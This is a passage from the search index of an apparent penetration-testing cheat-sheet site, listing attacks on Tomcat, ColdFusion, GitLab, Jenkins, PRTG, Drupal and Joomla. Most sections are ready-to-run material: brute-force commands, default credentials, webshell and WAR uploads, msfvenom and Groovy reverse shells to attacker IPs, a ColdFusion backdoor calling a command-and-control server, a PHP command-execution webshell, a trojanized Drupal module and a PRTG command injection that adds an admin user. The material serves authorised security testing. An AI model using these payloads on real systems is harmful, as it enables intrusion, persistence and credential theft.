vulnerabilities.</p>"},{"location":"Offensive-Security/Web-Application/Common-Applications/Apache-Tomcat/#identifying-jenkins-version","title":"Identifying Jenkins Version","text":"<ol> <li>Check version in documentation page: <code>curl -s http://[TOMCAT-DOMAIN]:8080/docs/ | grep Tomcat</code></li> <li>Obtain version from default error page: <code>curl -s http://[TOMCAT-DOMAIN]:8080/nonexistentpage | grep -i tomcat</code></li> <li>Obtain version using Nmap: <code>nmap -p 8080 --script http-server-header [TOMCAT-DOMAIN]</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/Apache-Tomcat/#directory-discovery","title":"Directory Discovery","text":"<ol> <li>Directory Fuzzing with FFUF: <code>ffuf -u https://[TOMCAT-DOMAIN]/FUZZ -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt</code></li> <li>Directory Fuzzing with Gobuster: <code>gobuster dir -u https://[TOMCAT-DOMAIN] -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt</code></li> <li>Directory Fuzzing with Wfuzz: <code>wfuzz -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt https://[TOMCAT-DOMAIN]/FUZZ</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/Apache-Tomcat/#default-credentials","title":"Default Credentials","text":"<ol> <li><code>admin</code>:<code>admin</code></li> <li><code>tomcat</code>:<code>tomcat</code></li> <li><code>admin</code>:</li> <li><code>admin</code>:<code>s3cr3t</code></li> <li><code>tomcat</code>:<code>s3cr3t</code></li> <li><code>admin</code>:<code>tomcat</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/Apache-Tomcat/#brute-force-apache-tomcat-credentials","title":"Brute-Force Apache Tomcat Credentials","text":"<ol> <li>Credential Brute-Forcing with Metasploit: <code>use auxiliary/scanner/http/tomcat_mgr_login</code></li> <li>Credential Brute-Forcing with Hydra: <code>hydra -L userlist.txt -P passlist.txt [TOMCAT-URL] http-post-form \"/manager/html:username=^[USER]^&amp;password=^[PASS]^&amp;Login=Login:Invalid credentials\" -t 10</code></li> <li>Credential Brute-Forcing with Nmap: <code>nmap -p 8080 --script http-brute --script-args http-brute.path=/manager/html,userdb=userlist.txt,passdb=passlist.txt [TOMCAT-URL]</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/Apache-Tomcat/#remote-code-execution-rce","title":"Remote Code Execution (RCE)","text":"<ol> <li>Download JSP shell using wget: <code>wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp</code></li> <li>Package shell into WAR file <code>jar -cvf MyShell.war *</code></li> <li>Upload the MyShell.war to Tomcat using either the manager GUI or a tool like curl: <code>curl -u admin:password -T MyShell.war http://[TOMCAT-DOMAIN]:8080/manager/text/deploy?path=/myshell</code></li> <li>Access the Shell <code>http://[TOMCAT-DOMAIN]:8080/myshell/cmd.jsp</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/Apache-Tomcat/#reverse-shell-using-metasploit","title":"Reverse Shell Using Metasploit","text":"<ol> <li>Create war File <code>msfvenom -p windows/shell_reverse_tcp LHOST=[IP-ADRESS] LPORT=9002 -f war &gt; MyShell.war</code></li> <li>List WAR contents. <code>jar -ft MyShell.war</code></li> <li>Upload the MyShell.war to Tomcat using either the manager GUI or a tool like curl: <code>curl -u admin:password -T MyShell.war http://[TOMCAT-DOMAIN]:8080/manager/text/deploy?path=/myshell</code></li> <li>Start Netcat to receive reverse shell <code>nc -lnvp 9002</code></li> <li>trigger reverse shell using curl <code>curl http://[TOMCAT-DOMAIN]:8080/myshell/orkmagcvdm.jsp</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/Apache-Tomcat/#using-metasploit","title":"Using Metasploit","text":"<ol> <li>Start Metasploit Framework: <code>msfconsole</code></li> <li>Select the Tomcat RCE exploit module: <code>msf&gt; use exploit/multi/http/tomcat_mgr_upload</code></li> <li>Create the WAR file: <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=80 -f war -o shell.war</code></li> <li>Upload the WAR file to the Tomcat server: <code>curl --upload-file shell.war -u 'tomcat:password' \"https://[TOMCAT-DOMAIN]/manager/text/deploy?path=/shell\"</code></li> <li>Starting a Listener on the Local Machine: <code>sudo nc -lvnp 80</code></li> <li>Accessing the Shell: <code>https://[TOMCAT-DOMAIN]/shell</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/Apache-Tomcat/#post-exploit","title":"Post Exploit","text":"<ol> <li>Find Tomcat credentials in tomcat-users.xml: <code>find / -name tomcat-users.xml 2&gt;/dev/null</code></li> <li>Gather Tomcat credentials with Metasploit: <code>msf&gt; use post/multi/gather/tomcat_gather</code> <code>msf&gt; use post/windows/gather/enum_tomcat</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/ColdFusion/","title":"ColdFusion","text":""},{"location":"Offensive-Security/Web-Application/Common-Applications/ColdFusion/#introduction","title":"Introduction","text":"<p>ColdFusion is a commercial rapid web application development platform created by Allaire Corporation, which is now maintained by Adobe Systems. It consists of a programming language known as ColdFusion Markup Language (CFML), an integrated development environment (IDE), and a scalable server for developing and delivering web and mobile applications. ColdFusion is designed to simplify the connection between HTML pages and databases, as well as to assist in building dynamic websites with advanced features that interact with databases, manipulate file content, manage session state, and integrate with various web services.</p>"},{"location":"Offensive-Security/Web-Application/Common-Applications/ColdFusion/#identifying-coldfusion-version","title":"Identifying ColdFusion Version","text":"<ol> <li>Obtaining Version Using URL Path Enumeration: <code>curl -I http://[COLDFUSION-DOMAIN]/CFIDE/administrator/</code></li> <li>Obtaining Version Using Nmap: <code>nmap -sV --script=http-coldfusion-version [COLDFUSION-DOMAIN]</code></li> <li>Checking Version from Banner Grabbing: <code>echo -e \"HEAD / HTTP/1.0\\r\\n\\r\\n\" | nc [COLDFUSION-DOMAIN] 80</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/ColdFusion/#default-directories-and-files-coldfusion","title":"Default Directories and Files ColdFusion","text":"<ol> <li>Access admin panel: <code>http://[COLDFUSION-DOMAIN]/CFIDE/administrator/index.cfm</code></li> <li>Checking for Accessible Scripts: <code>http://[COLDFUSION-DOMAIN]/CFIDE/scripts/</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/ColdFusion/#brute-force-coldfusion-credentials","title":"Brute-Force ColdFusion Credentials","text":"<ol> <li>Brute-Forcing with Hydra: <code>hydra -l admin -P password_list.txt [COLDFUSION-URL] http-post-form \"/CFIDE/administrator/index.cfm:cfadminPassword=^PASS^:F=incorrect\"</code></li> <li>Brute-Forcing with Medusa: <code>medusa -h [COLDFUSION-URL] -u admin -P password_list.txt -M http -m FORM:\"/CFIDE/administrator/index.cfm:cfadminPassword=^PASS^:F=incorrect\" -T 10</code></li> <li>Brute-Forcing with Ncrack: <code>ncrack -p http-form-post://[COLDFUSION-URL]/CFIDE/administrator/index.cfm -U admin -P password_list.txt</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/ColdFusion/#remote-code-execution-via-file-upload","title":"Remote Code Execution via File Upload","text":"<ol> <li>Download the webshell.cfm from the GitHub repository: <code>wget https://github.com/reider-roque/pentest-tools/blob/master/shells/webshell.cfm</code></li> <li>Setting Up a Local Server with Python: <code>python3 -m http.server 8000</code></li> <li>Accessing the ColdFusion Administrator: <code>Navigate to the admin panel.</code></li> <li>Scheduling a Task to Download the Web Shell:<ul> <li>Task Name: <code>backdoor_download</code></li> <li>URL: <code>http://192.168.119.112:8000/webshell.cfm</code></li> <li>Publish: <code>True</code></li> <li>File: <code>c:\\Inetpub\\wwwroot\\webshell.cfm</code></li> </ul> </li> <li>Opening the Web Shell via Browser: <code>http://10.11.1.10/webshell.cfm</code></li> <li>Use the web shell to execute a command on the server:<ul> <li>Command: <code>c:\\windows\\system32\\cmd.exe</code></li> <li>Options: <code>/c whoami &gt; c:\\Inetpub\\wwwroot\\output.txt</code></li> <li>Timeout: <code>5</code></li> </ul> </li> <li>View the output from the executed command: <code>http://10.11.1.10/output.txt</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/ColdFusion/#automating-exploitation-with-metasploit","title":"Automating Exploitation with Metasploit","text":"<ol> <li>Launch Metasploit Framework Console: <code>msfconsole</code></li> <li>Select the ColdFusion Exploit Module: <code>use exploit/windows/http/coldfusion_fckeditor</code></li> <li>Set the Remote Host (RHOST): <code>set RHOST [target]</code></li> <li>Set the Payload: <code>set payload windows/meterpreter/reverse_tcp</code></li> <li>Set the Local Host (LHOST): <code>set LHOST [YOUR_IP_ADDRESS]</code></li> <li>Execute the Exploit: <code>exploit</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/ColdFusion/#establish-persistence","title":"Establish Persistence","text":"<p>Add a scheduled task in ColdFusion to call back to a command and control server:</p> <pre><code>&lt;cfschedule action=\"update\" task=\"Backdoor\" operation=\"HTTPRequest\"\n                url=\"http://[ATTACKER_SERVER]/backdoor.cfm\" interval=\"600\"&gt;\n</code></pre>"},{"location":"Offensive-Security/Web-Application/Common-Applications/GitLab/","title":"GitLab","text":""},{"location":"Offensive-Security/Web-Application/Common-Applications/GitLab/#introduction","title":"Introduction","text":"<p>GitLab is an open-source DevOps platform that combines source code management (SCM) with continuous integration and delivery (CI/CD) tools. It allows teams to collaborate on code, track issues, and automate the software development process from a single application. GitLab is widely appreciated for its comprehensive suite of features that support project planning, source code management, testing, deployment, and monitoring.</p>"},{"location":"Offensive-Security/Web-Application/Common-Applications/GitLab/#public-information-gathering","title":"Public Information Gathering","text":"<ol> <li>Search for GitLab usernames: <code>site:[GITLAB-DOMAIN] \"username\"</code></li> <li>Google Dorking for Projects: <code>site:[GITLAB-DOMAIN] inurl:projects \"project name\"</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/GitLab/#identifying-gitlab-version","title":"Identifying GitLab Version","text":"<ol> <li>Obtaining Version from Header: <code>curl -s -I http://[GITLAB-DOMAIN]/ | grep -i \"X-Gitlab-Version\"</code></li> <li>Obtaining Version from Help Page <code>http://[GITLAB-DOMAIN]/help</code></li> <li>Obtaining Version Using Nmap: <code>nmap -sV -p 80,443 [GITLAB-DOMAIN]</code></li> <li>Using GitLab API to List Users: <code>curl -s http://[GITLAB-DOMAIN]/api/v4/users?private_token=[YOUR_TOKEN]</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/GitLab/#default-configuration-and-credentials","title":"Default Configuration and Credentials","text":"<ol> <li>Attempt default credentials (e.g., root:5iveL!fe) on the login page: <code>http://[GITLAB-DOMAIN]/users/sign_in</code></li> <li>Check for exposed .git directory: <code>wget -r -np -R \"index.html*\" http://[GITLAB-DOMAIN]/.git/</code></li> <li>Search for leaked secrets using TruffleHog: <code>trufflehog --json https://gitlab.com/[USERNAME]/repository.git</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/Jenkins/","title":"Jenkins","text":""},{"location":"Offensive-Security/Web-Application/Common-Applications/Jenkins/#introduction","title":"Introduction","text":"<p>Jenkins is an open-source automation server used for continuous integration and delivery (CI/CD) in software development. It automates tasks like building, testing, and deploying software, and supports a vast range of plugins to extend its capabilities.</p>"},{"location":"Offensive-Security/Web-Application/Common-Applications/Jenkins/#identifying-jenkins-version","title":"Identifying Jenkins Version","text":"<ol> <li>Check Version on Login Page: <code>Look at the bottom of the Jenkins login page for the version number.</code></li> <li>Using Jenkins API: <code>curl -s http://[JENKINS-IP]/api/json | jq .</code></li> <li>From the System Information page:     After logging in, navigate to <code>Manage Jenkins</code> \u2192 <code>System Information</code>.</li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/Jenkins/#brute-force-credentials","title":"Brute Force Credentials","text":"<ol> <li>Brute-Forcing with Metasploit: <code>auxiliary/scanner/http/jenkins_login</code></li> <li>Brute-Forcing with Hydra: <code>hydra -l admin -P /path/to/wordlist.txt [JENKINS-URL] http-form-post \"/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;Submit=Log+in:Invalid username or password\" -V</code></li> <li>Brute-Forcing with Medusa: <code>medusa -h [JENKINS-URL] -U /path/to/usernames.txt -P /path/to/wordlist.txt -M web-form -m DIR:/j_acegi_security_check -m FORM:'/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;Submit=Log+in:Invalid username or password'</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/Jenkins/#remote-code-execution-via-script-console","title":"Remote Code Execution via Script Console","text":"<ol> <li>Access script console: <code>http://[JENKINS-DOMAIN]:8080/script</code></li> <li> <p>Execute a Simple whoami:     <pre><code>def cmd = 'whoami'\ndef sout = new StringBuffer(), serr = new StringBuffer()\ndef proc = cmd.execute()\nproc.consumeProcessOutput(sout, serr)\nproc.waitForOrKill(1000)\nprintln sout\n</code></pre></p> </li> <li> <p>Run Linux Commands:     <pre><code>def cmd = \"cmd.exe /c dir\".execute();\nprintln(\"${cmd.text}\");\n</code></pre></p> </li> <li> <p>Windows Reverse Shell:     <pre><code>String host=\"10.10.14.3\";\nint port=1337;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n</code></pre></p> </li> <li> <p>Linux Reverse Shell:     <pre><code>r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/10.10.14.15/1337;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[])\np.waitFor()\n</code></pre></p> </li> </ol> <p>6 . Run listener with rlwrap to make the shell more usable <code>sudo rlwrap -cAr nc -lvnp 1337</code></p>"},{"location":"Offensive-Security/Web-Application/Common-Applications/Jenkins/#automating-exploitation-with-metasploit","title":"Automating Exploitation with Metasploit","text":"<pre><code># 1. Launch Metasploit\nmsfconsole\n\n# 2. Load the Jenkins script console exploit\nuse exploit/multi/http/jenkins_script_console\n\n# 3. Set the target IP address\nset RHOSTS [TARGET-IP]\n\n# 4. Set the Jenkins port (default is 8080)\nset RPORT 8080\n\n# 5. Set the path to the script console\nset TARGETURI /script\n\n# 6. Choose your payload (reverse shell using Meterpreter)\nset PAYLOAD java/meterpreter/reverse_tcp\n\n# 7. Set your local IP address (attacker)\nset LHOST [LOCAL-IP]\n\n# 8. Set the port to receive the reverse shell\nset LPORT [LOCAL-PORT]\n\n# 9. Run the exploit\nexploit\n</code></pre>"},{"location":"Offensive-Security/Web-Application/Common-Applications/Jenkins/#automating-exploitation-with-python-script","title":"Automating Exploitation with Python Script","text":"<pre><code>#!/usr/bin/env python3\nimport requests\nimport argparse\nimport re\nimport json\n\n\nimport urllib3\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\nparser = argparse.ArgumentParser(description = 'Jenkins Admin Groovy Console exec')\nparser.add_argument('url', type=str)\nparser.add_argument('-u', '--user', type=str)\nparser.add_argument('-p', '--password', type=str)\nparser.add_argument('-c', '--command', type=str, required=True)\nparser.add_argument('-C', '--cookie', type=str)\nparser.add_argument('-K', '--crumb', type=str)\n\nargs = parser.parse_args()\nURL = args.url\nCOOKIES = {}\nif args.user and args.password:\n    AUTH = (args.user, args.password)\nelse:\n    AUTH = None\nif args.cookie:\n    COOKIES = json.loads(args.cookie)\n\nDATA = {'script':\"def proc = ['bash', '-c', '''{}'''].execute();def os = new StringBuffer();proc.waitForProcessOutput(os, os);println(os.toString());\".format(args.command)}\n\nif args.crumb:\n    DATA.update(json.loads(args.crumb))\n\nr = requests.post(URL + '/script', data=DATA, auth=AUTH, cookies=COOKIES, verify=False)\nm = re.search('&lt;h2&gt;Result&lt;/h2&gt;&lt;pre&gt;(.*)&lt;/pre&gt;', r.text, flags=re.DOTALL)\nif m:\n    print(m.group(1))\nelse:\n    print('oops')\n    print(r.text)\n</code></pre>"},{"location":"Offensive-Security/Web-Application/Common-Applications/PRTG-Network-Monitor/","title":"PRTG Network Monitor","text":""},{"location":"Offensive-Security/Web-Application/Common-Applications/PRTG-Network-Monitor/#introduction","title":"Introduction","text":"<p>PRTG Network Monitor is a comprehensive network monitoring tool that allows businesses to observe and manage their IT infrastructure. It provides real-time data on the health and performance of network devices, servers, and services, enabling IT administrators to detect outages, optimize performance, and ensure system reliability. PRTG supports a wide range of technologies and comes with flexible alerting, reporting capabilities, and an intuitive interface for easy operation.</p>"},{"location":"Offensive-Security/Web-Application/Common-Applications/PRTG-Network-Monitor/#default-configuration-and-credentials","title":"Default Configuration and Credentials","text":"<ol> <li>Identify PRTG version <code>curl -s http://[PRTG-DOMAIN]/index.htm -A \"Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)\" | grep version</code></li> <li>Check if the PRTG default administrator credentials (prtgadmin:prtgadmin) are in use by accessing the login page: <code>http://[PRTG-DOMAIN]/index.htm</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/PRTG-Network-Monitor/#brute-force-prtg-credentials","title":"Brute-Force PRTG Credentials","text":"<ol> <li>Brute-Forcing with Hydra: <code>hydra -l admin -P /path/to/passwords.txt [PRTG-DOMAIN] http-post-form \"/public/checklogin.htm:login=^USER^&amp;password=^PASS^:Login failed\"</code></li> <li>Brute-Forcing with Medusa: <code>medusa -h [PRTG-DOMAIN] -u admin -P /path/to/passwords.txt -M http -m DIR:/public/checklogin.htm -m POST:login=^USER^&amp;password=^PASS^ -T 10</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/PRTG-Network-Monitor/#command-injection","title":"Command Injection","text":"<ol> <li>Navigate to Notifications Configuration: <code>Navigate to Setup &gt; Account Settings &gt; Notifications.</code></li> <li>Add New Notification: <code>Click the plus button on the right and select \"Add new notification\"</code></li> <li>Configure Notification: <code>Leave everything unchanged, scroll down to the bottom and select \u201cExecute Program\u201d.</code></li> <li>Choose a demo PowerShell script (e.g., demo.ps1) as the program file.</li> <li>In the Parameter field, enter the following command: <code>test.txt;net user hackfast p3nT3st! /add;net localgroup administrators anon /add</code></li> <li>Save the notification.</li> <li>In the list of notifications, check the box next to the new notification.</li> <li>Click the bell icon at the top to test the notification.</li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/PRTG-Network-Monitor/#remote-code-execution-rce","title":"Remote Code Execution (RCE)","text":"<ol> <li>Start Metasploit: <code>msfconsole</code></li> <li>Search for PRTG-Related Exploits: <code>searchsploit PRTG</code></li> <li>Use exploit module: <code>use exploit/windows/http/prtg_authenticated_rce</code></li> <li>Set the Target Host: <code>set RHOSTS [PRTG-URL]</code></li> <li>Set the Username: <code>set ADMIN_USERNAME admin</code></li> <li>Set the Password: <code>set ADMIN_PASSWORD prtgadmin</code></li> <li>Run exploit: <code>exploit</code></li> </ol> <p>Extract Configuration and Data:</p> <ol> <li>Locate configuration files to extract credentials and settings: <code>\\ProgramData\\Paessler\\PRTG Network Monitor</code> <code>PRTG Configuration.dat</code> <code>PRTG Configuration.old.bak</code></li> <li> <p>Encrypted password block format:</p> <pre><code>&lt;dbpassword&gt;\n    &lt;flags&gt;\n        &lt;encrypted/&gt;\n    &lt;/flags&gt;\n&lt;/dbpassword&gt;\n</code></pre> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/Readme/","title":"Readme","text":""},{"location":"Offensive-Security/Web-Application/Common-Applications/Readme/#methodology","title":"Methodology","text":"<p>There are many applications you may come across while performing penetration testing. I've provided a cheat sheet for some of the most common ones that you may find during your assessments. If you discover a software application that I haven't covered, don't worry. I've also included a generalized methodology that can be applied to any software application you might come across.</p>"},{"location":"Offensive-Security/Web-Application/Common-Applications/Readme/#step-1-information-gathering","title":"Step 1. Information Gathering","text":"<p>Begin by Understand the application architecture and identifying the version of the Application This information can often be critical in determining known vulnerabilities.</p> Task Description HTTP Headers Inspect HTTP headers as they might reveal version details of web servers, frameworks. HTML and JavaScript Comments Inspect the source code of web pages for comments that may include version numbers or build dates. Review Open Source Application Explore the GitHub/GitLab repository structure and read documentation to find files that could provide valuable information. File and Directory Discovery Use tools like DirBuster to discover hidden files and directories that are not linked from the main site but are still accessible. Use Specialized Automation Tools Use automation tools specifically built for certain applications, like WPScan for WordPress, to uncover vulnerabilities and configuration issues. Error Messages and Stack Traces Check for verbose error messages or stack traces in the application which can reveal useful information about the backend architecture. Browser Extensions Use browser extensions like Wappalyzer or BuiltWith to automatically detect and display web technology details."},{"location":"Offensive-Security/Web-Application/Common-Applications/Readme/#step-2-try-default-passwords","title":"Step 2. Try Default Passwords","text":"<p>Check for default passwords. Many Software are left with default credentials, which poses significant security risks if not changed.</p> Task Description Identify Default Credentials Refer to the application documentation or installation guides, search online for default credential lists, and be aware that some applications have default credentials that are not publicly documented. Common Default Credentials Examples <code>admin/admin</code>, <code>root/root</code>, <code>user/password</code>, <code>guest/guest</code>. Online Resources Use websites like <code>default-password.info</code> to find default credentials for various web applications. Automated Tools Use tools like <code>Hydra</code>, <code>Medusa</code>, or <code>Ncrack</code> to automate the process of trying default credentials . Check Configuration Files Inspect web application configuration files for hardcoded credentials that might have been left by developers. Review Source Code Analyze the web application source code for any hardcoded default credentials. Consult Community Forums Visit forums and community sites such as Reddit, Stack Overflow, or vendor-specific forums to see if others have shared default credentials for the web application in question."},{"location":"Offensive-Security/Web-Application/Common-Applications/Readme/#step-3-check-for-common-vulnerabilities","title":"Step 3. Check for Common Vulnerabilities","text":"<p>check If the version or plugin version vulnerable. by Using the following techniques:</p> Technique Query Example Use specialized databases and forums <code>site:exploit-db.com | site:github.com | site:securityfocus.com \"[Software Name] [version]\"</code> Search for exploits or vulnerabilities <code>\"[Software Name] [version]\" +exploit | vulnerability</code> Look for patches, updates, or changelogs <code>\"[Software Name] [version]\" +patch | update | changelog</code>"},{"location":"Offensive-Security/Web-Application/Common-Applications/Readme/#step-4-learn-to-exploit-the-vulnerability","title":"Step 4. Learn to Exploit the Vulnerability","text":"<p>If you are unfamiliar with how to exploit a found vulnerability, consider learning from practical examples and tutorials. A good resource for walkthroughs and tutorials is IppSec and 0xdf, which can be accessed here:</p> <ul> <li><code>https://ippsec.rocks/</code></li> <li><code>https://0xdf.gitlab.io/tags</code>     Use the search function to find relevant videos by entering the software name and version.</li> </ul>"},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/Drupal/","title":"Drupal","text":""},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/Drupal/#introduction","title":"Introduction","text":"<p>Drupal is a free and open-source content management system (CMS) used to build and manage websites. It's written in PHP and provides a backend framework for at least 2.3% of all websites worldwide, from personal blogs to corporate, political, and government sites.</p>"},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/Drupal/#identifying-drupal-version","title":"Identifying Drupal Version","text":"<ol> <li>View the CHANGELOG.txt file to identify the Drupal version: <code>http://[DRUPAL-DOMAIN]/CHANGELOG.txt</code></li> <li>For Drupal 8 and above, the core/CHANGELOG.txt file can be used to determine the version: <code>http://[DRUPAL-DOMAIN]/core/CHANGELOG.txt</code></li> <li>The drupal.js file may contain version information: <code>http://[DRUPAL-DOMAIN]/misc/drupal.js</code></li> <li>Check the page source for meta tags indicating the Drupal version: <code>&lt;meta name=\"generator\" content=\"Drupal 7 (http://drupal.org)\" /&gt;</code></li> <li>Droopescan is a scanner that can enumerate Drupal installations <code>droopescan scan drupal -u http://[DRUPAL-DOMAIN]</code></li> <li>Nmap, with the http-drupal-enum script, can be used to enumerate Drupal installations <code>nmap -sV --script http-drupal-enum --script-args http-drupal-enum.basepath=/ http://[DRUPAL-DOMAIN]</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/Drupal/#user-enumeration-techniques","title":"User Enumeration Techniques","text":"<ol> <li> <p>Analyze error messages to identify existing user accounts. Drupal redirects to user pages if the account exists: <code>for i in {1..10}; do curl -s -o /dev/null -w \"%{http_code}\" http://[DRUPAL-DOMAIN]/user/$i; done</code></p> </li> <li> <p>Measure response times for different user actions to infer the existence of user accounts:</p> <pre><code>import requests\nimport time\n\ndef measure_response_time(url, data):\n    start_time = time.time()\n    response = requests.post(url, data=data)\n    end_time = time.time()\n    return end_time - start_time\n\nuser_exists = measure_response_time('http://[DRUPAL-URL]/login', {'username': 'existing_user', 'password': 'wrong_password'})\nuser_not_found = measure_response_time('http://[DRUPAL-URL]/login', {'username': 'nonexistent_user', 'password': 'wrong_password'})\nprint('Existing user:', user_exists, 'Nonexistent user:', user_not_found)\n</code></pre> </li> <li> <p>Check for user-specific customization or redirections. If redirects to a login page for non-existent users and to a dashboard for existing users, this could be a potential vector for username enumeration. <code>http://[DRUPAL-DOMAIN]/users/[USERNAME]</code></p> </li> <li> <p>Droopescan can also be used to check for user enumeration <code>drupal -u http://[DRUPAL-DOMAIN] --enumerate u</code></p> </li> <li> <p>Investigate forums, articles, and comments on the target Drupal site. Users often leave traces or use similar usernames across different platforms.</p> </li> <li> <p>If the Drupal site has JSON API  you might be able to retrieve user information: <code>curl -s http://[DRUPAL-DOMAIN]/jsonapi/user/user | jq</code>     Look for unique identifiers or username fields in the JSON response.</p> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/Drupal/#php-code-execution-in-filter-module-drupal","title":"PHP Code Execution in Filter Module (Drupal)","text":""},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/Drupal/#step-1-enable-php-filter-module","title":"Step 1: Enable PHP Filter Module","text":"<ol> <li>Access the module administration panel by navigating to: <code>http://[DRUPAL-DOMAIN]/#overlay=admin/modules</code></li> <li>Locate and enable the PHP Filter module, then save the configuration.</li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/Drupal/#step-2-create-a-page-with-php-code","title":"Step 2: Create a Page with PHP Code","text":"<ol> <li>Navigate to the Content Creation Section: <code>http://[DRUPAL-DOMAIN]/#overlay=node/add</code></li> <li>Add a new Basic page, place the following PHP code to test command execution: <code>&lt;?php system($_GET['hackfast']); ?&gt;</code></li> <li>Ensure that the text format is set to \"PHP code\".</li> <li>Save the page. Note the URL of the newly created page, for example: <code>http://[DRUPAL-DOMAIN]/node/1</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/Drupal/#step-3-execute-commands","title":"Step 3: Execute Commands","text":"<ol> <li>To run commands, add a query string with the command you wish to execute, such as: <code>http://[DRUPAL-DOMAIN]/node/1?cmd=id</code></li> <li>Or use curl to execute the command from the terminal: <code>curl 'http://[DRUPAL-DOMAIN]/node/1?cmd=id'</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/Drupal/#modify-and-upload-module-with-web-shell","title":"Modify and Upload Module with Web Shell","text":"<ol> <li> <p>Download a module from Drupal.org, e.g., CAPTCHA: <code>wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz</code></p> </li> <li> <p>Extract archive: <code>tar xvf captcha-8.x-1.2.tar.gz</code></p> </li> <li> <p>Add a PHP web shell into one of the PHP files: <code>&lt;?php system($_GET['cmd']); ?&gt;</code></p> </li> <li> <p>Create a .htaccess file. This allows bypassing Drupal default access controls:</p> <pre><code>&lt;IfModule mod_rewrite.c&gt;\n  RewriteEngine On \n  RewriteBase /  \n&lt;/IfModule&gt;\n</code></pre> </li> <li> <p>Place this file in the root directory of the modified module.</p> </li> <li> <p>Repackage the modified module: <code>tar cvf modified_captcha.tar.gz captcha/</code></p> </li> <li> <p>Upload the module through the Drupal admin interface. <code>tar cvf modified_captcha.tar.gz captcha/</code></p> </li> <li> <p>Install the module.</p> </li> <li> <p>Navigate to the web shell URL and add the command: <code>http://[DRUPAL-DOMAIN]/modules/captcha/shell.php?cmd=id</code></p> </li> <li> <p>Or use curl to execute the command from the terminal: <code>curl 'http://[DRUPAL-DOMAIN]/modules/captcha/shell.php?cmd=id'</code></p> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/Joomla/","title":"Joomla","text":""},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/Joomla/#introduction","title":"Introduction","text":"<p>Joomla is a free and open-source content management system (CMS) used to create, manage, and publish digital content on websites. It provides a user-friendly interface and a range of features that allow users to build and maintain websites without needing to write code. Joomla is highly customizable, supporting extensions and templates to enhance functionality and design, making it a popular choice for websites of all sizes\u2014from personal blogs to large corporate sites.</p>"},{"location":"Offensive-Security/Web-Application/Common-Applications/cms/Joomla/#identifying-joomla-version","title":"Identifying Joomla Version","text":"<ol> <li> <p>Obtain Joomla Version from README: <code>curl -s http://[JOOMLA-DOMAIN]/README.txt | head -n 5</code></p> <pre><code>Joomla! version 3.9.22\nCopyright (c) 2005 - 2020 Open Source Matters.\nAll rights reserved.\nLicensed under GNU General Public License.\n</code></pre> </li> <li> <p>Check Version in Language Configuration: <code>curl -s http://[JOOMLA-DOMAIN]/language/en-GB/en-GB.xml</code></p> <pre><code>&lt;metadata&gt;\n    &lt;name&gt;English (United Kingdom)&lt;/name&gt;\n    &lt;version&gt;3.9.22&lt;/version&gt;\n    &lt;description&gt;English (United Kingdom) Language Pack&lt;/description&gt;\n&lt;/metadata&gt;\n</code></pre> </li> <li> <p>Check Version in XML Configuration Files: <code>curl -s http://[JOOMLA-DOMAIN]/plugins/system/cache/cache.xml</code></p> <pre><code>&lt;extension version=\"3.9.22\" type=\"plugin\" method=\"upgrade\"&gt;\n    &lt;name&gt;cache&lt;/name&gt;\n    